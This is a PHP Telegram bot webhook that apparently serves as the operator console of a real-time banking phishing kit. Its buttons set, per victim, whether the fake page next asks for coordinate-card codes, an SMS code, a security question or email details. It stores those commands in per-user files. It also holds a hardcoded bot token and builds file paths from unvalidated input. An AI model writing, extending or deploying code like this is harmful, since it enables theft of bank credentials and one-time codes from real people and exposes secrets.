<?php
$content = file_get_contents("php://input");
$update = json_decode($content, true);
$token = "7490119561:AAGJmnLToplJQ3FamNGMU6RKVSnSqsQ5g9c";
$chat_id = $update["message"]["chat"]["id"] ?? ($update["callback_query"]["from"]["id"] ?? null);

if (isset($update["callback_query"])) {
    $data = $update["callback_query"]["data"];
    list($accion, $usuario) = explode("|", $data);

    if ($accion === "COORD") {
        file_put_contents("acciones/{$usuario}_estado.txt", "ESPERANDO_COORDENADAS_3");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "✏️ Escribí las 3 coordenadas a mostrar (ej: A1B2C3) para el cliente: $usuario"
        ]));
    } elseif ($accion === "SMS") {
        file_put_contents("acciones/{$usuario}.txt", "/SMS");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "/SMS"
        ]));
    } elseif ($accion === "CLAVE") {
        file_put_contents("acciones/{$usuario}_estado.txt", "ESPERANDO_PREGUNTA");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "✏️ Escribí la pregunta que querés mostrar al cliente: $usuario"
        ]));
    } elseif ($accion === "CORREO") {
        file_put_contents("acciones/{$usuario}.txt", "/CORREO");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "/CORREO"
        ]));
    }
}

elseif (isset($update["message"])) {
    $msg = trim($update["message"]["text"]);
    $usuario = "";
    $estado = "";

    // Buscar si hay algún cliente esperando coordenadas o pregunta
    foreach (glob("acciones/*_estado.txt") as $estado_file) {
        $estado_actual = file_get_contents($estado_file);
        if ($estado_actual === "ESPERANDO_COORDENADAS_3" || $estado_actual === "ESPERANDO_PREGUNTA") {
            $usuario = basename($estado_file, "_estado.txt");
            $estado = $estado_actual;
            break;
        }
    }

    // Procesar coordenadas sin guiones ni espacios
    if ($estado === "ESPERANDO_COORDENADAS_3") {
        $msg = strtoupper(preg_replace("/[^A-Z0-9]/i", "", $msg)); // Limpia todo menos letras y números
        $partes = str_split($msg, 2); // Divide el texto en pares

        if (count($partes) === 3 &&
            preg_match('/^[A-Z][0-9]$/', $partes[0]) &&
            preg_match('/^[A-Z][0-9]$/', $partes[1]) &&
            preg_match('/^[A-Z][0-9]$/', $partes[2])) {

            file_put_contents("acciones/{$usuario}.txt", "/coordenadas etiquetas/" . implode(",", $partes));
            unlink("acciones/{$usuario}_estado.txt");

            file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
                "chat_id" => $chat_id,
                "text" => "✅ Coordenadas guardadas para $usuario: " . implode(", ", $partes)
            ]));
        } else {
            file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
                "chat_id" => $chat_id,
                "text" => "⚠️ Formato incorrecto. Debés escribir algo como A1B2C3 o A1-C3-B5"
            ]));
        }
    }

    // Procesar pregunta personalizada
    if ($estado === "ESPERANDO_PREGUNTA") {
        file_put_contents("acciones/{$usuario}.txt", "/palabra clave/" . $msg);
        unlink("acciones/{$usuario}_estado.txt");

        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "✅ Pregunta guardada para $usuario: $msg"
        ]));
    }
}
?>
